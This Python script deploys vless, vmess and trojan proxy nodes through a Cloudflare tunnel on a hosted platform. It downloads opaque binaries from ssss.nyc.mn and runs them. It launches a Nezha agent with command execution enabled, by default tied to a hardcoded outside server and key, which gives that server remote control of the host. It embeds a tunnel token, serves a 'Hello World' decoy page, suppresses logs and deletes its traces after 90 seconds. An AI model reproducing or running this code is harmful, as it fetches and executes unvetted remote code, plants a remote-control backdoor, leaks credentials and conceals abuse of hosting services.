_RESTART_TIMESTAMP = 1771749280  # Sun Feb 22 08:34:40 UTC 2026

import os
import re
import json
import time
import base64
import shutil
import asyncio
import requests
import platform
import subprocess
import threading
import signal
import sys
from threading import Thread, Lock
from http.server import BaseHTTPRequestHandler, HTTPServer
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Environment variables
UPLOAD_URL = os.environ.get('UPLOAD_URL', '')
PROJECT_URL = os.environ.get('PROJECT_URL', '')
AUTO_ACCESS = os.environ.get('AUTO_ACCESS', 'false').lower() == 'true'
FILE_PATH = os.environ.get('FILE_PATH', '.cache')
SUB_PATH = os.environ.get('SUB_PATH', 'sb')
UUID = os.environ.get('UUID', '907e9841-7abb-4013-91a4-3894d9e41928')
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nzmbv.wuge.nyc.mn:443')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
NEZHA_KEY = os.environ.get('NEZHA_KEY', 'gUxNJhaKJgceIgeapZG4956rmKFgmQgP')
ARGO_DOMAIN = os.environ.get('ARGO_DOMAIN', 'share.svip888.us.kg')
ARGO_AUTH = os.environ.get('ARGO_AUTH', 'eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiMTZhMjE2MjItNzZjNS00MzE0LWIxMzAtYzNlNjYxNzA5NmYyIiwicyI6IlpEYzJNR1ZsTVdZdE5UWm1ZUzAwWlRJeExXSTRNell0T0RJMVlXRTJNMlpsT1RZNSJ9')
ARGO_PORT = int(os.environ.get('ARGO_PORT', '8001'))
CFIP = os.environ.get('CFIP', 'spring.io')
CFPORT = int(os.environ.get('CFPORT', '443'))
NAME = os.environ.get('NAME', '')
CHAT_ID = os.environ.get('CHAT_ID', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000)

# Global variables
npm_path = os.path.join(FILE_PATH, 'npm')
php_path = os.path.join(FILE_PATH, 'php')
web_path = os.path.join(FILE_PATH, 'web')
bot_path = os.path.join(FILE_PATH, 'bot')
sub_path = os.path.join(FILE_PATH, 'sub.txt')
list_path = os.path.join(FILE_PATH, 'list.txt')
boot_log_path = os.path.join(FILE_PATH, 'boot.log')
config_path = os.path.join(FILE_PATH, 'config.json')

# Thread-safe lock for file operations
file_lock = Lock()

# Process tracking
running_processes = []

# Requests session with retry
def get_session():
    """创建带重试机制的requests session"""
    session = requests.Session()
    retry = Retry(
        total=3,
        backoff_factor=0.3,
        status_forcelist=[500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

# Signal handler for graceful shutdown
def signal_handler(signum, frame):
    """优雅关闭处理"""
    print("\nReceiving shutdown signal, cleaning up...")
    cleanup_processes()
    sys.exit(0)

# 只在支持信号的环境中注册信号处理器
try:
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
except (AttributeError, ValueError, OSError):
    # Streamlit Cloud或Windows等环境可能不支持某些信号
    print("Signal handlers not available in this environment")

# Create running folder
def create_directory():
    """创建运行目录"""
    print('\033c', end='')
    try:
        if not os.path.exists(FILE_PATH):
            os.makedirs(FILE_PATH, mode=0o755)
            print(f"{FILE_PATH} is created")
        else:
            print(f"{FILE_PATH} already exists")
    except Exception as e:
        print(f"Error creating directory: {e}")
        raise

# Delete nodes
def delete_nodes():
    """删除旧节点"""
    try:
        if not UPLOAD_URL:
            return

        if not os.path.exists(sub_path):
            return

        with file_lock:
            try:
                with open(sub_path, 'r', encoding='utf-8') as file:
                    file_content = file.read()
            except Exception as e:
                print(f"Error reading sub file: {e}")
                return None

        decoded = base64.b64decode(file_content).decode('utf-8')
        nodes = [line for line in decoded.split('\n') if any(protocol in line for protocol in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]

        if not nodes:
            return

        session = get_session()
        try:
            response = session.post(
                f"{UPLOAD_URL}/api/delete-nodes",
                data=json.dumps({"nodes": nodes}),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            if response.status_code == 200:
                print("Nodes deleted successfully")
        except requests.exceptions.RequestException as e:
            print(f"Error deleting nodes: {e}")
        finally:
            session.close()
    except Exception as e:
        print(f"Error in delete_nodes: {e}")

# Clean up old files
def cleanup_old_files():
    """清理旧文件"""
    paths_to_delete = ['web', 'bot', 'npm', 'php', 'boot.log', 'list.txt', 'tunnel.json', 'tunnel.yml', 'config.yaml']
    for file in paths_to_delete:
        file_path = os.path.join(FILE_PATH, file)
        try:
            if os.path.exists(file_path):
                if os.path.isdir(file_path):
                    shutil.rmtree(file_path)
                else:
                    os.remove(file_path)
                print(f"Removed {file}")
        except Exception as e:
            print(f"Error removing {file_path}: {e}")

class RequestHandler(BaseHTTPRequestHandler):
    """HTTP请求处理器"""
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(b'Hello World')
            
        elif self.path == f'/{SUB_PATH}':
            try:
                with file_lock:
                    if os.path.exists(sub_path):
                        with open(sub_path, 'rb') as f:
                            content = f.read()
                        self.send_response(200)
                        self.send_header('Content-type', 'text/plain; charset=utf-8')
                        self.send_header('Content-Disposition', 'inline')
                        self.end_headers()
                        self.wfile.write(content)
                    else:
                        self.send_response(404)
                        self.send_header('Content-type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(b'Subscription not found')
            except Exception as e:
                print(f"Error serving subscription: {e}")
                self.send_response(500)
                self.end_headers()
        
        elif self.path == '/health':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        """禁用访问日志"""
        pass
    
# Determine system architecture
def get_system_architecture():
    """检测系统架构"""
    architecture = platform.machine().lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    else:
        return 'amd'

# Download file based on architecture
def download_file(file_name, file_url, max_retries=3):
    """下载文件,带重试机制"""
    file_path = os.path.join(FILE_PATH, file_name)
    
    for attempt in range(max_retries):
        try:
            session = get_session()
            response = session.get(file_url, stream=True, timeout=60)
            response.raise_for_status()
            
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            
            session.close()
            print(f"Download {file_name} successfully")
            return True
        except Exception as e:
            print(f"Download {file_name} attempt {attempt + 1} failed: {e}")
            if os.path.exists(file_path):
                os.remove(file_path)
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff
            else:
                print(f"Download {file_name} failed after {max_retries} attempts")
                return False

# Get files for architecture
def get_files_for_architecture(architecture):
    """获取对应架构的文件列表"""
    if architecture == 'arm':
        base_files = [
            {"fileName": "web", "fileUrl": "https://arm64.ssss.nyc.mn/web"},
            {"fileName": "bot", "fileUrl": "https://arm64.ssss.nyc.mn/2go"}
        ]
    else:
        base_files = [
            {"fileName": "web", "fileUrl": "https://amd64.ssss.nyc.mn/web"},
            {"fileName": "bot", "fileUrl": "https://amd64.ssss.nyc.mn/2go"}
        ]

    if NEZHA_SERVER and NEZHA_KEY:
        if NEZHA_PORT:
            npm_url = "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
            base_files.insert(0, {"fileName": "npm", "fileUrl": npm_url})
        else:
            php_url = "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"
            base_files.insert(0, {"fileName": "php", "fileUrl": php_url})

    return base_files

# Authorize files with execute permission
def authorize_files(file_paths):
    """给文件添加执行权限"""
    for relative_file_path in file_paths:
        absolute_file_path = os.path.join(FILE_PATH, relative_file_path)
        if os.path.exists(absolute_file_path):
            try:
                os.chmod(absolute_file_path, 0o775)
                print(f"Empowerment success for {absolute_file_path}: 775")
            except Exception as e:
                print(f"Empowerment failed for {absolute_file_path}: {e}")

# Configure Argo tunnel
def argo_type():
    """配置Argo隧道"""
    if not ARGO_AUTH or not ARGO_DOMAIN:
        print("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels")
        return

    if "TunnelSecret" in ARGO_AUTH:
        try:
            with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as f:
                f.write(ARGO_AUTH)
            
            tunnel_id = ARGO_AUTH.split('"')[11]
            tunnel_yml = f"""tunnel: {tunnel_id}
credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: {ARGO_DOMAIN}
    service: http://localhost:{ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
"""
            with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as f:
                f.write(tunnel_yml)
            print("Argo tunnel config created")
        except Exception as e:
            print(f"Error creating Argo config: {e}")
    else:
        print(f"Use token connect to tunnel, please set the {ARGO_PORT} in cloudflare")

# Execute shell command and return output
def exec_cmd(command):
    """执行shell命令"""
    try:
        # 检查是否支持preexec_fn (Unix-like系统)
        kwargs = {
            'shell': True,
            'stdout': subprocess.PIPE,
            'stderr': subprocess.PIPE,
            'text': True
        }
        
        # 只在Unix系统上使用preexec_fn
        if hasattr(os, 'setsid'):
            kwargs['preexec_fn'] = os.setsid
        
        process = subprocess.Popen(command, **kwargs)
        running_processes.append(process)
        stdout, stderr = process.communicate(timeout=30)
        return stdout + stderr
    except subprocess.TimeoutExpired:
        process.kill()
        return "Command timeout"
    except Exception as e:
        print(f"Error executing command: {e}")
        return str(e)

# Start process in background
def start_background_process(command, process_name):
    """启动后台进程"""
    try:
        # 检查是否支持preexec_fn (Unix-like系统)
        kwargs = {
            'shell': True,
            'stdout': subprocess.DEVNULL,
            'stderr': subprocess.DEVNULL
        }
        
        # 只在Unix系统上使用preexec_fn
        if hasattr(os, 'setsid'):
            kwargs['preexec_fn'] = os.setsid
        
        process = subprocess.Popen(command, **kwargs)
        running_processes.append(process)
        print(f'{process_name} is running (PID: {process.pid})')
        return process
    except Exception as e:
        print(f"Error starting {process_name}: {e}")
        return None

# Cleanup processes
def cleanup_processes():
    """清理子进程"""
    for process in running_processes:
        try:
            if process.poll() is None:  # Process is still running
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        except Exception as e:
            print(f"Error terminating process: {e}")
            try:
                process.kill()
            except:
                pass

# Download and run necessary files
async def download_files_and_run():
    """下载并运行必要文件"""
    
    architecture = get_system_architecture()
    print(f"System architecture: {architecture}")
    
    files_to_download = get_files_for_architecture(architecture)
    
    if not files_to_download:
        print("Can't find a file for the current architecture")
        return
    
    # Download all files
    download_success = True
    for file_info in files_to_download:
        if not download_file(file_info["fileName"], file_info["fileUrl"]):
            download_success = False
    
    if not download_success:
        print("Error downloading files")
        return
    
    # Authorize files
    files_to_authorize = ['npm', 'web', 'bot'] if NEZHA_PORT else ['php', 'web', 'bot']
    authorize_files(files_to_authorize)
    
    # Check TLS
    port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else ""
    if port in ["443", "8443", "2096", "2087", "2083", "2053"]:
        nezha_tls = "true"
    else:
        nezha_tls = "false"

    # Configure nezha
    if NEZHA_SERVER and NEZHA_KEY:
        if not NEZHA_PORT:
            # Generate config.yaml for v1
            config_yaml = f"""client_secret: {NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 4
server: {NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: {nezha_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {UUID}"""
            
            with open(os.path.join(FILE_PATH, 'config.yaml'), 'w') as f:
                f.write(config_yaml)
            print("Nezha v1 config created")
    
    # Generate configuration file
    config = {
        "log": {
            "access": "/dev/null",
            "error": "/dev/null",
            "loglevel": "none"
        },
        "inbounds": [
            {
                "port": ARGO_PORT,
                "protocol": "vless",
                "settings": {
                    "clients": [{"id": UUID, "flow": "xtls-rprx-vision"}],
                    "decryption": "none",
                    "fallbacks": [
                        {"dest": 3001},
                        {"path": "/vless-argo", "dest": 3002},
                        {"path": "/vmess-argo", "dest": 3003},
                        {"path": "/trojan-argo", "dest": 3004}
                    ]
                },
                "streamSettings": {"network": "tcp"}
            },
            {
                "port": 3001,
                "listen": "127.0.0.1",
                "protocol": "vless",
                "settings": {
                    "clients": [{"id": UUID}],
                    "decryption": "none"
                },
                "streamSettings": {
                    "network": "ws",
                    "security": "none"
                }
            },
            {
                "port": 3002,
                "listen": "127.0.0.1",
                "protocol": "vless",
                "settings": {
                    "clients": [{"id": UUID, "level": 0}],
                    "decryption": "none"
                },
                "streamSettings": {
                    "network": "ws",
                    "security": "none",
                    "wsSettings": {"path": "/vless-argo"}
                },
                "sniffing": {
                    "enabled": True,
                    "destOverride": ["http", "tls", "quic"],
                    "metadataOnly": False
                }
            },
            {
                "port": 3003,
                "listen": "127.0.0.1",
                "protocol": "vmess",
                "settings": {
                    "clients": [{"id": UUID, "alterId": 0}]
                },
                "streamSettings": {
                    "network": "ws",
                    "wsSettings": {"path": "/vmess-argo"}
                },
                "sniffing": {
                    "enabled": True,
                    "destOverride": ["http", "tls", "quic"],
                    "metadataOnly": False
                }
            },
            {
                "port": 3004,
                "listen": "127.0.0.1",
                "protocol": "trojan",
                "settings": {
                    "clients": [{"password": UUID}]
                },
                "streamSettings": {
                    "network": "ws",
                    "security": "none",
                    "wsSettings": {"path": "/trojan-argo"}
                },
                "sniffing": {
                    "enabled": True,
                    "destOverride": ["http", "tls", "quic"],
                    "metadataOnly": False
                }
            }
        ],
        "outbounds": [
            {"protocol": "freedom", "tag": "direct"},
            {"protocol": "blackhole", "tag": "block"}
        ]
    }
    
    with open(config_path, 'w', encoding='utf-8') as config_file:
        json.dump(config, config_file, ensure_ascii=False, indent=2)
    print("Xray config created")
    
    # Run nezha
    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
        tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
        nezha_tls = '--tls' if NEZHA_PORT in tls_ports else ''
        command = f"{npm_path} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls}"
        start_background_process(command, 'npm')
        await asyncio.sleep(1)
    
    elif NEZHA_SERVER and NEZHA_KEY:
        command = f"{php_path} -c {FILE_PATH}/config.yaml"
        start_background_process(command, 'php')
        await asyncio.sleep(1)
    else:
        print('NEZHA variable is empty, skipping running')
    
    # Run xray
    command = f"{web_path} -c {config_path}"
    start_background_process(command, 'web')
    await asyncio.sleep(1)
    
    # Run cloudflared
    if os.path.exists(bot_path):
        if re.match(r'^[A-Z0-9a-z=]{120,250}$', ARGO_AUTH):
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {ARGO_AUTH}"
        elif "TunnelSecret" in ARGO_AUTH:
            args = f"tunnel --edge-ip-version auto --config {os.path.join(FILE_PATH, 'tunnel.yml')} run"
        else:
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {boot_log_path} --loglevel info --url http://localhost:{ARGO_PORT}"
        
        command = f"{bot_path} {args}"
        start_background_process(command, 'bot')
        await asyncio.sleep(3)
    
    # Extract domains and generate sub.txt
    await extract_domains()

# Extract domains from cloudflared logs
async def extract_domains(retry_count=0, max_retries=3):
    """从cloudflared日志中提取域名"""
    argo_domain = None

    if ARGO_AUTH and ARGO_DOMAIN:
        argo_domain = ARGO_DOMAIN
        print(f'ARGO_DOMAIN: {argo_domain}')
        await generate_links(argo_domain)
    else:
        try:
            if not os.path.exists(boot_log_path):
                if retry_count < max_retries:
                    print(f"Waiting for boot.log... (attempt {retry_count + 1}/{max_retries})")
                    await asyncio.sleep(3)
                    await extract_domains(retry_count + 1, max_retries)
                else:
                    print("boot.log not found after max retries")
                return
            
            with open(boot_log_path, 'r', encoding='utf-8', errors='ignore') as f:
                file_content = f.read()
            
            lines = file_content.split('\n')
            argo_domains = []
            
            for line in lines:
                domain_match = re.search(r'https?://([^ ]*trycloudflare\.com)/?', line)
                if domain_match:
                    domain = domain_match.group(1)
                    argo_domains.append(domain)
            
            if argo_domains:
                argo_domain = argo_domains[0]
                print(f'ArgoDomain: {argo_domain}')
                await generate_links(argo_domain)
            else:
                if retry_count < max_retries:
                    print(f'ArgoDomain not found, retrying... (attempt {retry_count + 1}/{max_retries})')
                    await asyncio.sleep(3)
                    await extract_domains(retry_count + 1, max_retries)
                else:
                    print('ArgoDomain not found after max retries')
        except Exception as e:
            print(f'Error reading boot.log: {e}')
            if retry_count < max_retries:
                await asyncio.sleep(3)
                await extract_domains(retry_count + 1, max_retries)

# Upload nodes to subscription service
def upload_nodes():
    """上传节点到订阅服务"""
    if UPLOAD_URL and PROJECT_URL:
        subscription_url = f"{PROJECT_URL}/{SUB_PATH}"
        json_data = {"subscription": [subscription_url]}
        
        session = get_session()
        try:
            response = session.post(
                f"{UPLOAD_URL}/api/add-subscriptions",
                json=json_data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                print('Subscription uploaded successfully')
        except Exception as e:
            print(f'Failed to upload subscription: {e}')
        finally:
            session.close()
    
    elif UPLOAD_URL:
        if not os.path.exists(list_path):
            return
        
        with file_lock:
            try:
                with open(list_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except Exception as e:
                print(f"Error reading list file: {e}")
                return
        
        nodes = [line for line in content.split('\n') if any(protocol in line for protocol in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]
        
        if not nodes:
            return
        
        json_data = json.dumps({"nodes": nodes})
        
        session = get_session()
        try:
            response = session.post(
                f"{UPLOAD_URL}/api/add-nodes",
                data=json_data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                print('Nodes uploaded successfully')
        except Exception as e:
            print(f'Failed to upload nodes: {e}')
        finally:
            session.close()
    
# Send notification to Telegram
def send_telegram():
    """发送Telegram通知"""
    if not BOT_TOKEN or not CHAT_ID:
        return
    
    try:
        with file_lock:
            if not os.path.exists(sub_path):
                return
            with open(sub_path, 'r', encoding='utf-8') as f:
                message = f.read()
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        escaped_name = re.sub(r'([_*\[\]()~>#+=|{}.!\-])', r'\\\1', NAME)
        
        params = {
            "chat_id": CHAT_ID,
            "text": f"**{escaped_name}节点推送通知**\n{message}",
            "parse_mode": "MarkdownV2"
        }
        
        session = get_session()
        response = session.post(url, params=params, timeout=10)
        session.close()
        
        if response.status_code == 200:
            print('Telegram message sent successfully')
    except Exception as e:
        print(f'Failed to send Telegram message: {e}')

# Generate links and subscription content
async def generate_links(argo_domain):
    """生成订阅链接"""
    try:
        # Get geo info
        session = get_session()
        try:
            response = session.get('https://api.ip.sb/geoip', timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            geo_data = response.json()
            country_code = geo_data.get('country_code', 'Unknown')
            isp = geo_data.get('isp', 'Unknown').replace(' ', '_').strip()
        except Exception as e:
            print(f"Error getting geo info: {e}")
            country_code = 'Unknown'
            isp = 'Unknown'
        finally:
            session.close()
        
        if NAME and NAME.strip():
            ISP = f"{NAME.strip()}-{country_code}_{isp}"
        else:
            ISP = f"{country_code}_{isp}"

        VMESS = {
            "v": "2",
            "ps": f"{ISP}",
            "add": CFIP,
            "port": CFPORT,
            "id": UUID,
            "aid": "0",
            "scy": "none",
            "net": "ws",
            "type": "none",
            "host": argo_domain,
            "path": "/vmess-argo?ed=2560",
            "tls": "tls",
            "sni": argo_domain,
            "alpn": "",
            "fp": "chrome"
        }
    
        list_txt = f"""vless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={argo_domain}&fp=chrome&type=ws&host={argo_domain}&path=%2Fvless-argo%3Fed%3D2560#{ISP}

vmess://{base64.b64encode(json.dumps(VMESS).encode('utf-8')).decode('utf-8')}

trojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={argo_domain}&fp=chrome&type=ws&host={argo_domain}&path=%2Ftrojan-argo%3Fed%3D2560#{ISP}"""
        
        with file_lock:
            with open(list_path, 'w', encoding='utf-8') as list_file:
                list_file.write(list_txt)

            sub_txt = base64.b64encode(list_txt.encode('utf-8')).decode('utf-8')
            with open(sub_path, 'w', encoding='utf-8') as sub_file:
                sub_file.write(sub_txt)
            
        print(f"\n{sub_txt}\n")
        print(f"{sub_path} saved successfully")
        
        # Additional actions
        send_telegram()
        upload_nodes()
      
        return sub_txt
    except Exception as e:
        print(f"Error generating links: {e}")
        return None
 
# Add automatic access task
def add_visit_task():
    """添加自动访问任务"""
    if not AUTO_ACCESS or not PROJECT_URL:
        print("Skipping adding automatic access task")
        return
    
    session = get_session()
    try:
        response = session.post(
            'https://keep.gvrander.eu.org/add-url',
            json={"url": PROJECT_URL},
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code == 200:
            print('Automatic access task added successfully')
    except Exception as e:
        print(f'Failed to add URL: {e}')
    finally:
        session.close()

# Clean up files after delay
async def clean_files():
    """延迟清理文件"""
    await asyncio.sleep(90)  # Wait 90 seconds
    
    files_to_delete = [boot_log_path, config_path, list_path]
    
    for file in files_to_delete:
        try:
            if os.path.exists(file):
                if os.path.isdir(file):
                    shutil.rmtree(file)
                else:
                    os.remove(file)
        except Exception as e:
            print(f"Error deleting {file}: {e}")
    
    print('\033c', end='')
    print('App is running')
    print('Thank you for using this script, enjoy!')

# Health check for processes
async def health_check_loop():
    """健康检查循环"""
    while True:
        await asyncio.sleep(300)  # Check every 5 minutes
        
        # Check if processes are still running
        for process in running_processes[:]:
            if process.poll() is not None:
                print(f"Process {process.pid} has exited with code {process.returncode}")
                running_processes.remove(process)

# Main function to start the server
async def start_server():
    """启动服务器"""
    delete_nodes()
    cleanup_old_files()
    create_directory()
    argo_type()
    await download_files_and_run()
    add_visit_task()
    
    # Start HTTP server in separate thread
    server_thread = Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # Start cleanup task
    asyncio.create_task(clean_files())
    
    # Start health check
    asyncio.create_task(health_check_loop())
    
def run_server():
    """运行HTTP服务器"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), RequestHandler)
        print(f"Server is running on port {PORT}")
        print(f"Running done!")
        print(f"\nLogs will be deleted in 90 seconds, you can copy the above nodes!")
        server.serve_forever()
    except Exception as e:
        print(f"Error starting server: {e}")
        
async def main():
    """主异步函数"""
    await start_server()
    
    # Keep running
    while True:
        await asyncio.sleep(3600)
        
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nShutting down...")
        cleanup_processes()
    except Exception as e:
        print(f"Fatal error: {e}")
        cleanup_processes()
        sys.exit(1)
